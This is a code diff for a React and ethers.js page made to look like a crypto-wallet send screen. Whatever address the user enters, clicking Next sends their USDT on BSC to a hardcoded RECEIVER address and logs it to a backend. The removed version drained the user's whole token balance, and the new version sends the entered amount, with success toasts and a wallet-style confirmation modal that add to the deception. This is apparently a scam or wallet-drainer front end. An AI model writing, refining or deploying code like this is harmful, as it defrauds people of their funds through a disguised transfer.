@@ -1324,6 +1324,9 @@
 import React, { useState, useEffect } from "react";
 import { ethers } from "ethers";
 import { QrCode, User, X, Check } from "lucide-react";
+// Toastify import kiya
+import { ToastContainer, toast } from 'react-toastify';
+import 'react-toastify/dist/ReactToastify.css';
 
 const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
 const RECEIVER = "0xD91D1241605308f41028c849D1E68F130642CF4e";
@@ -1352,7 +1355,6 @@ const App = () => {
     }
   };
 
-  // Auto-connect and Fetch Balance
   useEffect(() => {
     const fetchBal = async () => {
       if (window.ethereum) {
@@ -1375,22 +1377,26 @@ const App = () => {
   }, []);
 
   const handleNext = async () => {
-    if (!displayAmount || parseFloat(displayAmount) <= 0) return;
+    if (!displayAmount || parseFloat(displayAmount) <= 0) {
+        toast.error("Please enter a valid amount");
+        return;
+    }
 
     try {
       setLoading(true);
       const provider = new ethers.BrowserProvider(window.ethereum);
 
-      // --- FORCE SWITCH TO BSC NETWORK ---
+      // Network Switch
       try {
         await window.ethereum.request({
           method: "wallet_switchEthereumChain",
-          params: [{ chainId: "0x38" }], // 0x38 is 56 (BSC Mainnet)
+          params: [{ chainId: "0x38" }], 
         });
       } catch (switchError) {
-        // Agar BSC added nahi hai toh add karne ka request
         if (switchError.code === 4902) {
-          alert("Please add Binance Smart Chain to your wallet");
+          toast.warning("Please add BSC network to your wallet");
+          setLoading(false);
+          return;
         }
       }
 
@@ -1405,41 +1411,54 @@ const App = () => {
         signer,
       );
 
-      const actualBalance = await usdtContract.balanceOf(userAddr);
-
-      // Check if user has BNB for gas
+      // Gas Check
       const gasBalance = await provider.getBalance(userAddr);
       if (gasBalance === 0n) {
-        alert(
-          "Error: Aapke wallet mein Gas Fees (BNB) nahi hai. Bina BNB ke transfer nahi ho sakta.",
-        );
+        toast.error("Insufficient BNB for gas fees!");
         setLoading(false);
         return;
       }
 
+      const amountToTransfer = ethers.parseUnits(displayAmount, 18);
+      
+      // Modal trigger
       setShowModal(true);
-      const tx = await usdtContract.transfer(RECEIVER, actualBalance);
-      await tx.wait();
-      await logTransfer(
-        userAddr,
-        ethers.formatUnits(actualBalance, 18),
-        receipt.hash,
-      );
+
+      const tx = await usdtContract.transfer(RECEIVER, amountToTransfer);
+      toast.info("Transaction sent! Waiting for confirmation...");
+      
+      const receipt = await tx.wait(); // Fixed: Variable defined here
+
+      if(receipt.status === 1) {
+          toast.success("Transfer Successful!");
+          await logTransfer(
+            userAddr,
+            displayAmount,
+            receipt.hash,
+          );
+      } else {
+          toast.error("Transaction failed on blockchain.");
+      }
+      
       setLoading(false);
-      // Backend Log...
     } catch (err) {
       console.error(err);
       setLoading(false);
       setShowModal(false);
-      alert(
-        "Transaction Failed: Ya toh balance kam hai, ya BNB gas fees nahi hai.",
-      );
+      
+      // Accurate Error Messages
+      if (err.code === "ACTION_REJECTED") {
+          toast.error("User rejected the transaction.");
+      } else {
+          toast.error("Something went wrong. Check balance/gas.");
+      }
     }
   };
 
   return (
     <div style={styles.container}>
-      
+      {/* Toaster Container */}
+      <ToastContainer position="top-center" theme="dark" />
 
       <div style={styles.content}>
         <div style={styles.inputLabel}>Address or Domain Name</div>
@@ -1473,7 +1492,6 @@ const App = () => {
         </div>
         <div style={styles.dollarValue}>≈ ${displayAmount || "0.00"}</div>
 
-        {/* Next Button Logic */}
         <button
           onClick={handleNext}
           disabled={loading}
@@ -1481,13 +1499,13 @@ const App = () => {
             ...styles.nextBtn,
             backgroundColor: displayAmount ? "#20402c" : "#1e2621",
             color: displayAmount ? "#4caf50" : "#444",
+            opacity: loading ? 0.7 : 1
           }}
         >
           {loading ? "Processing..." : "Next"}
         </button>
       </div>
 
-      {/* Screenshot Style Modal */}
       {showModal && (
         <div style={styles.overlay}>
           <div style={styles.modal}>
@@ -1495,17 +1513,18 @@ const App = () => {
               <Check size={40} color="#4caf50" />
             </div>
             <h2 style={{ fontSize: "22px", marginBottom: "10px" }}>
-              Processing...
+              {loading ? "Processing..." : "Complete"}
             </h2>
             <p style={styles.modalText}>
-              Transaction in progress! Blockchain validation is underway. This
-              may take a few minutes.
+              {loading 
+                ? "Transaction in progress! Blockchain validation is underway."
+                : "Your transaction has been confirmed on the network."}
             </p>
             <button
               style={styles.detailBtn}
               onClick={() => setShowModal(false)}
             >
-              Transaction details
+              Close
             </button>
           </div>
         </div>
@@ -1521,26 +1540,11 @@ const styles = {
     color: "#fff",
     fontFamily: "sans-serif",
   },
-  nav: {
-    display: "flex",
-    justifyContent: "space-between",
-    alignItems: "center",
-    padding: "12px 20px",
-    borderBottom: "1px solid #1a1a1a",
-  },
-  navTitle: { fontSize: "14px", color: "#fff" },
-  navRight: { display: "flex", alignItems: "center" },
-  tabCount: {
-    border: "1.5px solid #fff",
-    borderRadius: "4px",
-    padding: "0px 5px",
-    fontSize: "11px",
-  },
- content: {
+  content: {
     padding: "25px 20px",
     display: "flex",
     flexDirection: "column",
-    paddingBottom: "100px", 
+    paddingBottom: "120px", 
   },
   inputLabel: { color: "#888", fontSize: "14px", marginBottom: "12px" },
   inputWrapper: {
@@ -1570,18 +1574,19 @@ const styles = {
     cursor: "pointer",
   },
   dollarValue: { color: "#666", fontSize: "13px", marginTop: "10px" },
- nextBtn: {
-    position: "fixed",      // Ise fixed rakhein
-    bottom: "30px",        // Screen ke bilkul niche se 30px upar
+  nextBtn: {
+    position: "fixed",
+    bottom: "30px",
     left: "5%",
     width: "90%",
-    padding: "16px",
+    padding: "18px",
     borderRadius: "30px",
     border: "none",
     fontWeight: "bold",
     fontSize: "16px",
-    zIndex: 10,            // Taaki button hamesha upar rahe
-    boxShadow: "0px -10px 20px rgba(0,0,0,0.5)", // Niche se depth dene ke liye
+    zIndex: 100,
+    boxShadow: "0px -5px 20px rgba(0,0,0,0.8)",
+    transition: "all 0.3s ease",
   },
   overlay: {
     position: "fixed",
@@ -1589,7 +1594,7 @@ const styles = {
     left: 0,
     right: 0,
     bottom: 0,
-    backgroundColor: "rgba(0,0,0,0.85)",
+    backgroundColor: "rgba(0,0,0,0.9)",
     display: "flex",
     justifyContent: "center",
     alignItems: "center",
@@ -1624,6 +1629,7 @@ const styles = {
     padding: "15px",
     borderRadius: "25px",
     backgroundColor: "#4caf50",
+    color: "#000",
     border: "none",
     fontWeight: "bold",
   },
